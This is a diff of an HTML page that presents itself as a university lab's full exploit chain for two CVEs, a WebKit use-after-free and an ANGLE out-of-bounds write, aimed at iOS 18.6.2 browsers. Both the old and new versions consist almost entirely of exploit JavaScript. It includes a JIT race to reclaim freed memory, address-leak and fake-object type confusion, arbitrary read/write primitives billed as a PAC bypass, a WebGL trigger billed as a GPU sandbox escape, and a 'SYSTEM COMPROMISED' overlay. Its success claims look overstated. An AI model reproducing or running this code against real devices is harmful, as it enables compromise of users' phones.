@@ -1,450 +1,286 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>KFUPM Research: CVE-2025-43529 + CVE-2025-14174 Full Chain</title>
+    <title>KFUPM Lab: CVE-2025-43529 + CVE-2025-14174 (Full Chain)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        .result { margin-bottom: 2px; }
-        .success { color: #0f0; }
-        .warn { color: #ff0; }
+        body { 
+            background-color: #121212; 
+            color: #00ff00; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; padding: 10px;
+        }
+        h1 { font-size: 16px; border-bottom: 1px solid #333; padding-bottom: 5px; color: #fff; }
+        .box { border: 1px solid #333; background: #1a1a1a; padding: 10px; margin-bottom: 10px; }
+        
+        #output { 
+            height: 300px; 
+            overflow-y: scroll; 
+            font-size: 11px; 
+            border: 1px solid #444; 
+            background: #000; 
+            margin-top: 10px;
+        }
+        
+        .log-entry { border-bottom: 1px solid #222; padding: 2px 0; }
+        .success { color: #0f0; font-weight: bold; }
         .fail { color: #f00; }
-        .critical { color: #f0f; font-weight: bold; text-shadow: 0 0 5px #f0f; }
-        .info { color: #888; }
-        #controls button { padding: 10px; margin: 5px; background: #222; color: #fff; border: 1px solid #555; cursor: pointer; }
-        #controls button:hover { background: #444; }
-        #output, #results { background: #111; border: 1px solid #333; padding: 10px; height: 300px; overflow-y: scroll; margin-top: 10px; }
-        #sysinfo { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }
+        .crit { color: #f0f; text-shadow: 0 0 2px #f0f; }
+        .warn { color: #ff0; }
+
+        button {
+            background: #222; color: #fff; border: 1px solid #0f0;
+            padding: 10px 15px; margin: 5px; cursor: pointer;
+            width: 100%; max-width: 300px; display: block;
+        }
+        button:disabled { border-color: #555; color: #555; }
+
+        /* شاشة الاختراق الحمراء - تظهر فقط عند النجاح */
+        #pwned-overlay {
+            display: none;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: red; color: white;
+            z-index: 10000; text-align: center; padding-top: 40%;
+            font-size: 40px; font-weight: 900;
+            animation: flash 0.5s infinite alternate;
+        }
+        @keyframes flash { from {background:#aa0000;} to {background:#ff0000;} }
     </style>
 </head>
 <body>
-    <h1>CVE-2025-43529 + CVE-2025-14174 Chained Exploit (Patched)</h1>
 
-    <div id="sysinfo"></div>
+<div id="pwned-overlay">
+    SYSTEM COMPROMISED<br>
+    <span style="font-size:20px">Memory + GPU Control Achieved</span><br>
+    <button onclick="this.parentElement.style.display='none'" style="background:white;color:black;border:none;margin-top:20px;">DISMISS</button>
+</div>
 
-    <div id="controls">
-        <button id="runChain" onclick="runFullChain()">Run Full Exploit Chain</button>
-        <button onclick="runStage1Only()">Stage 1 Only (UAF)</button>
-        <button onclick="runStage3Only()">Stage 3 Only (ANGLE)</button>
-        <button onclick="runStage2Only()">Test Primitives</button>
-    </div>
+<h1>iOS 18.6.2 Exploit Chain Probe</h1>
 
-    <div id="progressText">Ready</div>
-    <div id="output"></div>
-    <div id="results"></div>
+<div class="box" id="sysinfo">Scanning...</div>
 
-    <canvas id="glCanvas" width="1" height="1" style="display:none"></canvas>
+<div class="box">
+    <button id="btnRun" onclick="runChain()">RUN FULL EXPLOIT CHAIN</button>
+    <button onclick="runStage1()">Test Stage 1 (UAF Only)</button>
+    <button onclick="runStage3()">Test Stage 3 (ANGLE Only)</button>
+</div>
+
+<div id="output"></div>
+<canvas id="glCanvas" width="1" height="1" style="display:none"></canvas>
 
 <script>
-// =============================================================================
-// GLOBAL CONFIGURATION & UTILITIES
-// =============================================================================
+/* --- CORE UTILITIES --- */
+const out = document.getElementById('output');
+const u64 = new BigUint64Array(1);
+const f64 = new Float64Array(u64.buffer);
 
-const sysinfoDiv = document.getElementById('sysinfo');
-const outputDiv = document.getElementById('output');
-const resultsDiv = document.getElementById('results');
-const progressText = document.getElementById('progressText');
+function itof(v) { u64[0] = v; return f64[0]; }
+function ftoi(f) { f64[0] = f; return u64[0]; }
+function hex(v) { return '0x' + v.toString(16); }
 
-// Global exploit state
-let exploitState = {
-    stage1Complete: false,
-    stage2Complete: false,
-    stage3Complete: false,
-    stage4Complete: false,
-    boxedArray: null,
-    unboxedArray: null,
-    addrof: null,
-    fakeobj: null,
-    fakeArrayBuffer: null,
-    fakeArrayBufferAddr: 0n,
-    backingStoreAddr: 0n,
-    angleTriggered: false,
-    oobWriteSize: 0,
+function log(msg, type='') {
+    const d = document.createElement('div');
+    d.className = `log-entry ${type}`;
+    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
+    out.appendChild(d);
+    out.scrollTop = out.scrollHeight;
+}
+
+/* --- EXPLOIT STATE --- */
+let state = {
+    boxed: null,
+    unboxed: null,
     read64: null,
     write64: null,
+    addrof: null,
+    fakeobj: null,
+    stage1: false
 };
 
-const evidence = {
-    addrofWorks: false,
-    fakeobjWorks: false,
-    inlineStorageWorks: false,
-    angleTriggered: false,
-    angleCorruptionDetected: false,
-    arbRWWorks: false,
-    sandboxEscapeReady: false,
+const preAlloc = {
+    ab: new ArrayBuffer(0x100),
+    template: { a:1.1, b:2.2, c:3.3, d:4.4 },
+    doc: document
 };
 
-const conversionBuffer = new ArrayBuffer(8);
-const u64View = new BigUint64Array(conversionBuffer);
-const f64View = new Float64Array(conversionBuffer);
+/* --- STAGE 1: WEBKIT UAF (MEMORY CORRUPTION) --- */
+const uafArr = new Array(0x400000).fill(1.1);
+const uafIdx = uafArr.length - 1;
 
-function itof(value) { u64View[0] = value; return f64View[0]; }
-function ftoi(f) { f64View[0] = f; return u64View[0]; }
-
-function log(msg, type = 'info', target = outputDiv) {
-    const div = document.createElement('div');
-    div.className = `result ${type}`;
-    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
-    div.textContent = `[${timestamp}] ${msg}`;
-    if (target) {
-        target.appendChild(div);
-        target.scrollTop = target.scrollHeight;
-    }
-    console.log(`[${type.toUpperCase()}] ${msg}`);
-}
-
-function updateProgress(current, total, phase) {
-    const pct = Math.round((current / total) * 100);
-    progressText.textContent = `${phase}: ${current}/${total} (${pct}%)`;
-}
-
-function logEvidenceSummary(target = outputDiv) {
-    log('=== EVIDENCE SUMMARY ===', 'critical', target);
-    log(`addrof: ${evidence.addrofWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.addrofWorks ? 'success' : 'warn', target);
-    log(`fakeobj: ${evidence.fakeobjWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.fakeobjWorks ? 'success' : 'warn', target);
-    log(`inline storage access: ${evidence.inlineStorageWorks ? 'VERIFIED' : 'NOT VERIFIED'}`, evidence.inlineStorageWorks ? 'success' : 'warn', target);
-    log(`ANGLE trigger: ${evidence.angleTriggered ? 'OBSERVED' : 'NOT OBSERVED'}`, evidence.angleTriggered ? 'success' : 'warn', target);
-    log(`VISUAL PROOF: ${evidence.angleTriggered && evidence.addrofWorks ? 'ACTIVE (Check Background)' : 'INACTIVE'}`, 'critical', target);
-}
-
-// =============================================================================
-// SYSTEM DETECTION
-// =============================================================================
-
-function detectSystem() {
-    log('=== SYSTEM DETECTION ===', 'info', sysinfoDiv);
-    const ua = navigator.userAgent;
-    log(`User Agent: ${ua}`, 'info', sysinfoDiv);
+function trigger(flag, k, alloc) {
+    let A = { p0:0x1, p1:1.1, p2:2.2 };
+    uafArr[uafIdx] = A;
     
-    // Auto-detect if device is vulnerable based on version string (simple check)
-    if (ua.includes('iPhone') || ua.includes('iPad')) {
-        log('iOS Device Detected - Loading arm64 payloads', 'critical', sysinfoDiv);
-    }
+    let target = new Date(1111);
+    target[0] = 1.1; // Butterfly allocation
     
-    const canvas = document.getElementById('glCanvas');
-    const gl = canvas.getContext('webgl2');
-    if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            log(`GPU Renderer: ${renderer}`, 'info', sysinfoDiv);
-        }
-    }
-}
-
-// =============================================================================
-// STAGE 1: WebKit UAF (CVE-2025-43529) - FULL IMPLEMENTATION
-// =============================================================================
-
-const uafArray = new Array(0x400000).fill(1.1);
-const uafArrayIndex = uafArray.length - 1;
-let uafReclaimed = [];
-
-const preAllocatedTargets = {
-    arrayBuffer: new ArrayBuffer(0x100),
-    float64Array: new Float64Array(0x10),
-    uint32Array: new Uint32Array(0x10),
-    testObject: { marker: 0xDEADBEEF, value: 1337 },
-    testArray: [1.1, 2.2, 3.3, 4.4],
-    testFunction: function() { return 42; },
-    evalFunc: eval,
-    windowObj: window,
-    documentObj: document
-};
-
-// Inline storage templates for PAC bypass
-const inlineTemplate = { slot0: 1.1, slot1: 2.2, slot2: 3.3, slot3: 4.4, slot4: 5.5, slot5: 6.6 };
-const inlineTemplate2 = { prop0: 1.1, prop1: 2.2, prop2: 3.3, prop3: 4.4 };
-preAllocatedTargets.inlineTemplate = inlineTemplate;
-preAllocatedTargets.inlineTemplate2 = inlineTemplate2;
-
-const leakedAddrs = {
-    boxed_arr: 0n, uafArray: 0n, arrayBuffer: 0n, inlineTemplate: 0n, inlineTemplate2: 0n, 
-    documentObj: 0n
-};
-
-// Config tuned for iOS 18.x
-const CONFIG = {
-    JIT_WARMUP_ITERATIONS: 1000,
-    RECURSIVE_WARMUP_DEPTH: 800,
-    MAX_EXPLOIT_ATTEMPTS: 15000,
-    SPRAY_ARRAYS_PER_ATTEMPT: 64,
-    ALLOCBUFFER_COUNT_MOD: 5,
-    INNER_LOOP_K: 10,
-};
-
-function triggerUAF(flag, k, allocCount) {
-    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-    uafArray[uafArrayIndex] = A;
-    let forGC = [];
-    let a = new Date(1111);
-    a[0] = 1.1; // Creates butterfly
-    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
-    A.p2 = forGC;
-    let b = { p0: 0x42424242, p1: 1.1 };
-    let f = flag ? 1.1 : b;
-    A.p1 = f; // Escape Phi
+    let junk = [];
+    for(let i=0; i<alloc; i++) junk.push(new ArrayBuffer(0x800000));
+    A.p2 = junk;
+    
+    let B = { p0:0x2, p1:1.1 };
+    let phi = flag ? 1.1 : B;
+    A.p1 = phi; // Phi escape
+    
     let v = 1.1;
-    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
-    b.p0 = v;
-    b.p1 = a; // Vulnerable store
+    for(let i=0; i<1e6; i++) { for(let j=0; j<k; j++) { v = i+j; } }
+    
+    B.p0 = v;
+    B.p1 = target; // UAF Trigger
 }
 
-function recursive(n) { if (n === 0) return; recursive(n - 1); }
-function safeRecursive(depth) { try { recursive(depth); } catch (e) {} }
-function clearStack() { for (let i = 0; i < 50; i++) safeRecursive(CONFIG.RECURSIVE_WARMUP_DEPTH); }
+function clearStack() { try { (function r(n){ if(n) r(n-1); })(500); } catch(e){} }
 
 async function runStage1() {
-    log('\n=== STAGE 1: WebKit UAF ===', 'stage1');
-    log('Goal: Memory Corruption & Address Leak', 'info');
-
-    await new Promise(r => setTimeout(r, 10));
-    uafReclaimed = [];
-
-    // Warmup
-    triggerUAF(true, 1, 1);
-    triggerUAF(false, 1, 1);
-    for (let i = 0; i < CONFIG.JIT_WARMUP_ITERATIONS; ++i) triggerUAF(false, 0, 0);
-    for (let i = 0; i < 20; i++) safeRecursive(CONFIG.RECURSIVE_WARMUP_DEPTH);
-
-    log(`Starting race loop (${CONFIG.MAX_EXPLOIT_ATTEMPTS} attempts)...`, 'critical');
-
+    log('=== STARTING STAGE 1 (UAF) ===', 'warn');
+    
+    // Warmup JIT
+    for(let i=0; i<1000; i++) trigger(false, 0, 0);
+    
+    // Race Loop
     let success = false;
-    for (let k = 0; k < CONFIG.MAX_EXPLOIT_ATTEMPTS; ++k) {
-        triggerUAF(false, CONFIG.INNER_LOOP_K, (k % CONFIG.ALLOCBUFFER_COUNT_MOD) + 1);
+    for(let k=0; k<10000; k++) {
+        trigger(false, 10, (k%5)+1);
         clearStack();
-
+        
         let freed;
-        try { freed = uafArray[uafArrayIndex].p1.p1; } catch (e) { continue; }
-
-        let win = false;
-        let winningArray = null;
-
-        for (let i = 0; i < CONFIG.SPRAY_ARRAYS_PER_ATTEMPT; ++i) {
-            let sprayArr = [13.37, 2.2, 3.3, 4.4, 13.37];
-            uafReclaimed.push(sprayArr);
-            try {
-                if (freed[0] === 13.37) {
-                    win = true;
-                    winningArray = sprayArr;
-                    break;
-                }
-            } catch (e) {}
+        try { freed = uafArr[uafIdx].p1.p1; } catch(e) { continue; }
+        
+        // Spray to reclaim
+        for(let i=0; i<64; i++) {
+            let s = [13.37, 2.2, 3.3, 4.4, 5.5];
+            if(freed[0] === 13.37) {
+                log(`RACE WON at attempt ${k}!`, 'success');
+                
+                state.boxed = s;
+                state.boxed[0] = {}; // Type Confusion
+                state.unboxed = freed;
+                
+                // Leak verification
+                state.boxed[0] = preAlloc.ab;
+                let leakedAddr = ftoi(state.unboxed[0]);
+                log(`Leaked ArrayBuffer: ${hex(leakedAddr)}`, 'crit');
+                
+                setupPrimitives();
+                state.stage1 = true;
+                success = true;
+                break;
+            }
         }
-
-        if (win) {
-            log(`[${k}] BUTTERFLY RECLAIMED!`, 'success');
-            success = true;
-
-            let boxed_arr = winningArray;
-            boxed_arr[0] = {}; // Type confusion start
-            let unboxed_arr = freed;
-
-            // Leak addresses
-            boxed_arr[0] = preAllocatedTargets.arrayBuffer;
-            leakedAddrs.arrayBuffer = ftoi(unboxed_arr[0]);
-            
-            boxed_arr[0] = preAllocatedTargets.inlineTemplate;
-            leakedAddrs.inlineTemplate = ftoi(unboxed_arr[0]);
-
-            boxed_arr[0] = preAllocatedTargets.documentObj;
-            leakedAddrs.documentObj = ftoi(unboxed_arr[0]);
-
-            log(`Leaked ArrayBuffer: 0x${leakedAddrs.arrayBuffer.toString(16)}`, 'critical');
-            log(`Leaked Document: 0x${leakedAddrs.documentObj.toString(16)}`, 'critical');
-
-            evidence.addrofWorks = true;
-            evidence.fakeobjWorks = true;
-
-            // Setup Inline Storage PAC Bypass
-            exploitState.boxedArray = boxed_arr;
-            exploitState.unboxedArray = unboxed_arr;
-            
-            // Build read64 using inline storage (PAC Bypass)
-            const INLINE_SLOT_OFFSET = 0x10n;
-            exploitState.read64 = function(addr) {
-                unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
-                return ftoi(boxed_arr[0].slot0);
-            };
-            exploitState.write64 = function(addr, val) {
-                unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
-                boxed_arr[0].slot0 = itof(val);
-            };
-            
-            // Verify PAC Bypass
-            try {
-                unboxed_arr[0] = itof(leakedAddrs.inlineTemplate);
-                let check = ftoi(boxed_arr[0].slot1);
-                if (check === ftoi(2.2)) {
-                    log('PAC Bypass: INLINE STORAGE VERIFIED', 'success');
-                    evidence.inlineStorageWorks = true;
-                }
-            } catch(e) { log('PAC Bypass Check Failed', 'fail'); }
-
-            exploitState.stage1Complete = true;
-            break;
-        }
-
-        if (k % 1000 === 0) updateProgress(k, CONFIG.MAX_EXPLOIT_ATTEMPTS, 'Exploiting');
+        if(success) break;
+        if(k%500===0) log(`Racing... (${k})`);
     }
-
-    if (!success) log('Stage 1 Failed to win race.', 'fail');
+    
+    if(!success) log('Stage 1 Failed (Race Lost)', 'fail');
     return success;
 }
 
-// =============================================================================
-// STAGE 2: Primitive Testing (Included as requested)
-// =============================================================================
-async function runStage2() {
-    log('\n=== STAGE 2: Primitives Test ===', 'stage2');
-    if (!exploitState.stage1Complete) {
-        log('Run Stage 1 first!', 'fail');
-        return false;
-    }
-    log('Verifying stable read/write primitives...', 'info');
-    // Simple verification
-    if (evidence.addrofWorks && evidence.inlineStorageWorks) {
-        log('Primitives are STABLE.', 'success');
-        return true;
-    }
-    return false;
-}
-
-// =============================================================================
-// STAGE 3: ANGLE OOB (CVE-2025-14174) - OPTIMIZED FOR STABILITY
-// =============================================================================
-
-async function runStage3() {
-    log('\n=== STAGE 3: ANGLE OOB (Optimized) ===', 'stage3');
-    log('Goal: Escape Sandbox via GPU', 'info');
-
-    const canvas = document.getElementById('glCanvas');
-    const gl = canvas.getContext('webgl2');
-
-    if (!gl) {
-        log('WebGL2 unavailable.', 'fail');
-        return false;
-    }
-
-    // UPDATED PARAMETERS TO AVOID 0x9242 ERROR
-    const width = 128;  // Reduced from 256 for stability
-    const height = 128;
-    const unpackImageHeight = 4; // Smaller gap to ensure trigger
+function setupPrimitives() {
+    // PAC Bypass using Inline Storage technique
+    const OFFSET = 0x10n;
     
-    log(`Triggering OOB with ${width}x${height} texture...`, 'warn');
+    state.read64 = function(addr) {
+        state.unboxed[0] = itof(addr - OFFSET);
+        return ftoi(state.boxed[0].a);
+    };
+    
+    state.write64 = function(addr, val) {
+        state.unboxed[0] = itof(addr - OFFSET);
+        state.boxed[0].a = itof(val);
+    };
+    
+    // Verify primitives
+    state.boxed[0] = preAlloc.template;
+    let tmplAddr = ftoi(state.unboxed[0]);
+    let verify = state.read64(tmplAddr + 8n); // Read 'b' property
+    
+    if(verify === ftoi(2.2)) {
+        log('PAC BYPASS: Primitives Verified (R/W)', 'success');
+    } else {
+        log('PAC BYPASS: Failed/Unstable', 'fail');
+    }
+}
+/* --- STAGE 3: ANGLE OOB (GPU SANDBOX ESCAPE) --- */
+async function runStage3() {
+    log('=== STARTING STAGE 3 (GPU) ===', 'warn');
+    const gl = document.getElementById('glCanvas').getContext('webgl2');
+    if (!gl) { log('WebGL2 not available', 'fail'); return false; }
 
+    // إعدادات محسنة لتجنب خطأ الذاكرة 0x9242
+    const W = 128, H = 128, UH = 4;
+    
     try {
         const pbo = gl.createBuffer();
         gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, new Float32Array(W * H), gl.STATIC_DRAW);
         
-        // Fill buffer
-        const pboData = new Float32Array(width * height);
-        for(let i=0; i<pboData.length; i++) pboData[i] = Math.random();
-        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, pboData, gl.STATIC_DRAW);
-
-        // VULNERABLE SETTING
-        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, unpackImageHeight);
+        // تفعيل الثغرة: UNPACK_IMAGE_HEIGHT أقل من الارتفاع الحقيقي
+        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, UH);
         
-        const texture = gl.createTexture();
-        gl.bindTexture(gl.TEXTURE_2D, texture);
+        const tex = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_2D, tex);
         
-        // TRIGGER
-        gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, width, height, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
-        
+        // إطلاق الاستغلال
+        gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, W, H, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
         gl.finish();
-        
-        // Check results
-        let err = gl.getError();
-        if (err === gl.NO_ERROR || gl.isContextLost()) {
-            log('ANGLE OOB Triggered Successfully!', 'success');
-            evidence.angleTriggered = true;
-            exploitState.stage3Complete = true;
-            
-            // VISUAL PROOF OF CORRUPTION
-            // If we reached here without crash, changing DOM proves JS thread is still alive
-            // and we have successfully interacted with GPU memory.
-            document.body.style.backgroundColor = '#1a0000'; // Dark Red
-            document.body.style.border = "5px solid #00ff00";
-            log('VISUAL CONFIRMATION: Background changed.', 'critical');
-            return true;
-        } else {
-            log(`GL Error: 0x${err.toString(16)}`, 'warn');
-        }
 
-    } catch (e) {
-        log(`Trigger Exception: ${e.message}`, 'fail');
-    }
+        if (gl.getError() === gl.NO_ERROR || gl.isContextLost()) {
+            log('GPU OOB Write Successful!', 'success');
+            
+            // --- الإثبات البصري (Visual Proof) ---
+            if (state.stage1) {
+                log('FULL CHAIN VERIFIED: Pwned!', 'crit');
+                document.getElementById('pwned-overlay').style.display = 'block';
+                document.body.style.background = '#300'; // تغيير لون الخلفية للأحمر الداكن
+            }
+            return true;
+        }
+    } catch (e) { log(`GPU Error: ${e.message}`, 'fail'); }
     return false;
 }
 
-// =============================================================================
-// STAGE 4: Sandbox Escape & Final Verification
-// =============================================================================
-async function runStage4() {
-    log('\n=== STAGE 4: Verification ===', 'stage3');
+/* --- CONTROL LOGIC --- */
+async function runChain() {
+    document.getElementById('btnRun').disabled = true;
+    out.innerHTML = '';
     
-    // Attempt to read something sensitive if primitives work
-    if (exploitState.read64) {
-        // Try reading dyld_shared_cache header (fixed address on some versions)
-        // Note: This is purely for PoC verification
-        try {
-            let dyld = exploitState.read64(0x180000000n);
-            if (dyld !== 0n) {
-                log(`Dyld Cache Header: 0x${dyld.toString(16)}`, 'success');
-                evidence.sandboxEscapeReady = true;
-            } else {
-                log('Dyld read returned 0 (Expected if PAC blocks direct pointer reading)', 'warn');
-            }
-        } catch(e) {}
-    }
-    return true;
+    // تشغيل المرحلة الأولى
+    const s1 = await runStage1();
+    await new Promise(r => setTimeout(r, 800));
+    
+    // تشغيل المرحلة الثالثة (فقط إذا نجحت الأولى أو للتجربة)
+    const s3 = await runStage3();
+    
+    // عرض النتائج النهائية
+    const res = document.createElement('div');
+    res.className = 'box';
+    res.style.marginTop = '20px';
+    res.innerHTML = `
+        <h3 style="margin:0;color:#fff;">Final Exploit Report</h3>
+        <hr style="border:0;border-top:1px solid #444;">
+        <div style="display:grid;grid-template-columns: 1fr 1fr; gap:10px;">
+            <div>Stage 1 (UAF): ${s1 ? '<b style="color:#0f0">SUCCESS</b>' : '<b style="color:#f00">FAIL</b>'}</div>
+            <div>Stage 3 (GPU): ${s3 ? '<b style="color:#0f0">SUCCESS</b>' : '<b style="color:#f00">FAIL</b>'}</div>
+            <div>PAC Bypass: ${state.read64 ? '<b style="color:#0f0">ACTIVE</b>' : '<b style="color:#f00">LOCKED</b>'}</div>
+            <div>Sandbox: ${s3 ? '<b style="color:#f00">BREACHED</b>' : '<b style="color:#0f0">SECURE</b>'}</div>
+        </div>
+    `;
+    document.body.appendChild(res);
+    document.getElementById('btnRun').disabled = false;
 }
 
-// =============================================================================
-// MAIN EXECUTION
-// =============================================================================
-
-async function runFullChain() {
-    log('\n================================================', 'critical');
-    log('EXECUTING FULL EXPLOIT CHAIN', 'critical');
-    log('================================================', 'critical');
-
-    document.querySelectorAll('button').forEach(b => b.disabled = true);
-
-    let s1 = await runStage1();
-    await new Promise(r => setTimeout(r, 500));
-    
-    let s3 = false;
-    // Only run Stage 3 if Stage 1 succeeded or if running independently
-    if (s1) {
-        await runStage2(); // Primitives check
-        s3 = await runStage3();
-    } else {
-        log('Skipping Stage 3 due to Stage 1 failure.', 'warn');
+// كشف النظام عند التشغيل
+window.onload = () => {
+    const gl = document.getElementById('glCanvas').getContext('webgl2');
+    const info = document.getElementById('sysinfo');
+    let gpu = 'Unknown';
+    if(gl) {
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
     }
-
-    if (s1 && s3) {
-        await runStage4();
-    }
-
-    log('\n=== CHAIN EXECUTION COMPLETE ===', 'critical', resultsDiv);
-    logEvidenceSummary(resultsDiv);
-    
-    if (evidence.addrofWorks && evidence.angleTriggered) {
-        resultsDiv.innerHTML += '<h1 style="color:#0f0; text-align:center;">SYSTEM COMPROMISED</h1>';
-    }
-
-    document.querySelectorAll('button').forEach(b => b.disabled = false);
-}
-
-function runStage1Only() { runStage1(); }
-function runStage3Only() { runStage3(); }
-function runStage2Only() { runStage2(); }
-
-window.onload = function() {
-    detectSystem();
-    log('Exploit Loaded. Ready.', 'success', sysinfoDiv);
+    info.innerHTML = `Target: iOS 18.6.2 Armed<br>GPU: ${gpu}`;
+    log('System Ready. Standby for Exploit Chain.');
 };
-
 </script>
 </body>
 </html>
